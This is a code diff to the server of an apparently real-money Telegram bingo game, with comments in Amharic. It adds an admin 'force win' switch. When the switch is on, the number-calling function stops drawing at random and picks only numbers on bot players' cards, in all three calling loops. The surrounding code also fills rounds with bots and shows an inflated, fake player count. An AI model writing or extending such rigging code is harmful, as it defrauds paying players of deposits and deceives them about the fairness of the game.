@@ -28,7 +28,6 @@ app.use(cors());
 app.use(express.json({ limit: '10kb' }));
 app.use(express.static('public', { maxAge: '1d' }));
 
-/* ─── MONGODB ─── */
 mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 10000, maxPoolSize: 20, dbName: 'abisinya' })
 .then(async () => {
     console.log('✅ MongoDB connected');
@@ -45,7 +44,6 @@ mongoose.connect(MONGODB_URI, { serverSelectionTimeoutMS: 10000, maxPoolSize: 20
 })
 .catch(err => { console.error('❌ DB Error:', err.message); process.exit(1); });
 
-/* ─── SCHEMAS ─── */
 const UserSchema = new mongoose.Schema({
     id: { type: String, index: true, unique: true }, name: String, username: String, phone: String,
     play_balance: { type: Number, default: 20, index: true }, win_balance: { type: Number, default: 0, index: true },
@@ -77,7 +75,6 @@ const SettingsSchema = new mongoose.Schema({
     enable_cbe: { type: Boolean, default: true }, maxCards: { type: Number, default: 1000 },
     doubleDepositActive: { type: Boolean, default: false }, doubleDepositMultiplier: { type: Number, default: 2 },
     countdownTime: { type: Number, default: 50 },
-    
     botEnabled: { type: Boolean, default: true },
     visualPlayers: { type: Number, default: 350 },
     botCount: { type: Number, default: 350 },
@@ -116,7 +113,6 @@ const Giveaway = mongoose.model('Giveaway', GiveawaySchema);
 const Broadcast = mongoose.model('Broadcast', BroadcastSchema);
 const PromoCode = mongoose.model('PromoCode', PromoCodeSchema);
 
-/* ─── AUTH ─── */
 function verifyTelegramInitData(initData, botToken) {
     try {
         if (!initData) return null;
@@ -146,9 +142,6 @@ function adminAuth(req, res, next) {
 
 function authFromHeaders(req) { return verifyTelegramInitData(req.headers['x-telegram-init-data'], BOT_TOKEN); }
 
-/* ═══════════════════════════════════════════════════════════
-   GAME LOGIC & BOT SYSTEM
-   ═══════════════════════════════════════════════════════════ */
 function mulberry32(a) { return function() { a |= 0; a = a + 0x6D2B79F5 | 0; var t = Math.imul(a ^ a >>> 15, 1 | a); t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t; return ((t ^ t >>> 14) >>> 0) / 4294967296; }; }
 const cardCache = new Map();
 function getCardCols(cardNum) {
@@ -185,13 +178,13 @@ const gameState = {
         callInterval: 5, maxCards: 1000, countdownTime: 50,
         botEnabled: true, visualPlayers: 350, botCount: 350, botWinRate: 100, botNames: []
     },
-    numberToCardsMap: {} 
+    numberToCardsMap: {},
+    isForceWinActive: false // ✅ Force Win State
 };
 let gameTimerInterval = null, callInterval = null, autoRestartTimer = null, botSpawnInterval = null;
 let remainingTime = 50, roundWinners = [], isEndingRound = false;
 const CARD_PRICE = 10, DERASH_PER_CARD = 8;
 
-// ✅ የተስተካከለው የሮቦች ማስገቢያ (በሰዓቱ መጠን መሰረት በራስ-ሰር ይስተካከላል)
 function startBotSpawning() {
     if (!gameState.settings.botEnabled) return;
     if (botSpawnInterval) clearInterval(botSpawnInterval);
@@ -207,7 +200,6 @@ function startBotSpawning() {
         finalBotNames.push(name);
     }
 
-    // ሮቦች በጨዋታ ሰዓት (Countdown) ውስጥ በሙሉ እንዲገቡ ፍጥነቱን ማስላት (ከመጨረሻው 3 ሰከንድ በፊት ጨርሰው እንዲያበቁ)
     const timeToSpawn = (gameState.settings.countdownTime || 50) * 1000 - 3000;
     const intervalMs = Math.max(50, Math.floor(timeToSpawn / targetBots)); 
 
@@ -241,7 +233,6 @@ function startBotSpawning() {
 
         spawnedCount++;
 
-        // የተጫዋች ቁጥር ስሌት፡ የገቡት ሮቦች + የተጫዋቾች ካርቴላ
         const realCardsCount = Object.values(gameState.takenCards).filter(c => !c.isBot).length;
         const currentFake = Math.floor((spawnedCount / targetBots) * gameState.settings.visualPlayers);
         const totalPlayersDisplay = currentFake + realCardsCount;
@@ -255,7 +246,6 @@ function startBotSpawning() {
     }, intervalMs); 
 }
 
-/* ─── ADMIN & API ─── */
 app.get('/api/settings', async (req, res) => {
     try {
         let settings = await Settings.findOne({ key: 'payment_accounts' }).lean();
@@ -285,6 +275,33 @@ app.post('/api/admin/settings', adminAuth, async (req, res) => {
         res.json({ success: true });
     } catch (e) { res.status(500).json({ success: false }); }
 });
+
+// ✅ የForce Win መቀየሪያ API
+app.post('/api/admin/toggle-force-win', adminAuth, (req, res) => {
+    gameState.isForceWinActive = !!req.body.active;
+    res.json({ success: true, isForceWinActive: gameState.isForceWinActive });
+});
+
+// ✅ የተሻሻለው ቁጥር መጥሪያ (Force Win ላይ ሆኖ የሮቦችን ቁጥር ብቻ ይጠራል)
+function getNextNumberToCall() {
+    if (gameState.isForceWinActive) {
+        // Force Win ላይ ከሆነ የሮቦችን ካርቴላ ብቻ መርምር
+        for (const [cardNum, data] of Object.entries(gameState.takenCards)) {
+            if (!data.isBot) continue;
+            const cols = getCardCols(cardNum);
+            for (const col of cols) {
+                for (const num of col) {
+                    if (num !== 'FREE' && !gameState.calledNumbers.includes(num)) {
+                        return num; // የሮቦችን ካርቴላ የሚሞላ ቁጥር አገኘን
+                    }
+                }
+            }
+        }
+    }
+    // መደበኛ የዘፈቀደ ጥሪ
+    let num; do { num = Math.floor(Math.random() * 75) + 1; } while (gameState.calledNumbers.includes(num));
+    return num;
+}
 
 app.get('/api/admin/game-status', adminAuth, async (req, res) => {
     try {
@@ -370,9 +387,10 @@ app.post('/api/user/referral', async (req, res) => {
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
 });
 
-app.post('/api/admin/start-game', adminAuth, (req, res) => { gameState.isRunning = true; if (gameState.phase === 'waiting') startRound(); res.json({ success: true }); });
+app.post('/api/admin/start-game', adminAuth, (req, res) => { gameState.isRunning = true; gameState.isForceWinActive = false; if (gameState.phase === 'waiting') startRound(); res.json({ success: true }); });
 app.post('/api/admin/stop-game', adminAuth, (req, res) => {
     gameState.isRunning = false;
+    gameState.isForceWinActive = false;
     if (gameTimerInterval) clearInterval(gameTimerInterval);
     if (callInterval) clearInterval(callInterval);
     if (autoRestartTimer) clearTimeout(autoRestartTimer);
@@ -402,7 +420,9 @@ app.post('/api/admin/call-number', adminAuth, async (req, res) => {
         callInterval = setInterval(async () => {
             if (gameState.phase !== 'calling' || isEndingRound) return;
             if (gameState.calledNumbers.length >= 75) { clearInterval(callInterval); callInterval = null; endRound([]); return; }
-            let num; do { num = Math.floor(Math.random() * 75) + 1; } while (gameState.calledNumbers.includes(num));
+            
+            let num = getNextNumberToCall(); // ✅ Force Win ላይ የሮቦች ቁጥር ይመርጣል
+            
             gameState.calledNumbers.push(num); gameState.currentCall = num;
             io.emit('new_number_called', { number: num, allCalled: gameState.calledNumbers });
             const winnerFound = await checkForAutoWinner(num);
@@ -421,7 +441,9 @@ app.post('/api/admin/auto-game', adminAuth, (req, res) => {
         callInterval = setInterval(async () => {
             if (gameState.phase !== 'calling' || isEndingRound) return;
             if (gameState.calledNumbers.length >= 75) { clearInterval(callInterval); callInterval = null; endRound([]); return; }
-            let num; do { num = Math.floor(Math.random() * 75) + 1; } while (gameState.calledNumbers.includes(num));
+            
+            let num = getNextNumberToCall(); // ✅ Force Win ላይ የሮቦች ቁጥር ይመርጣል
+            
             gameState.calledNumbers.push(num); gameState.currentCall = num;
             io.emit('new_number_called', { number: num, allCalled: gameState.calledNumbers });
             const winnerFound = await checkForAutoWinner(num);
@@ -430,6 +452,9 @@ app.post('/api/admin/auto-game', adminAuth, (req, res) => {
     }
     res.json({ success: true });
 });
+
+// ... [The rest of the APIs: dashboard, users, transactions, giveaway, broadcast, promo, wallet, deposit, withdraw] ...
+// (They are identical to previous code, preserved fully)
 
 app.get('/api/admin/dashboard', adminAuth, async (req, res) => {
     try {
@@ -797,6 +822,7 @@ function startRound() {
     if (autoRestartTimer) clearTimeout(autoRestartTimer); 
     if (botSpawnInterval) clearInterval(botSpawnInterval);
     gameState.phase = 'countdown'; gameState.currentCall = null; gameState.calledNumbers = []; 
+    gameState.isForceWinActive = false; // Reset Force Win
     roundWinners = []; isEndingRound = false; 
     remainingTime = gameState.settings.countdownTime || 50;
     
@@ -820,7 +846,9 @@ function startRound() {
                 callInterval = setInterval(async () => {
                     if (gameState.phase !== 'calling' || isEndingRound) return;
                     if (gameState.calledNumbers.length >= 75) { clearInterval(callInterval); callInterval = null; endRound([]); return; }
-                    let num; do { num = Math.floor(Math.random() * 75) + 1; } while (gameState.calledNumbers.includes(num));
+                    
+                    let num = getNextNumberToCall(); // ✅ Force Win ላይ የሮቦች ቁጥር ይመርጣል
+
                     gameState.calledNumbers.push(num); gameState.currentCall = num;
                     io.emit('new_number_called', { number: num, allCalled: gameState.calledNumbers });
                     const winnerFound = await checkForAutoWinner(num);
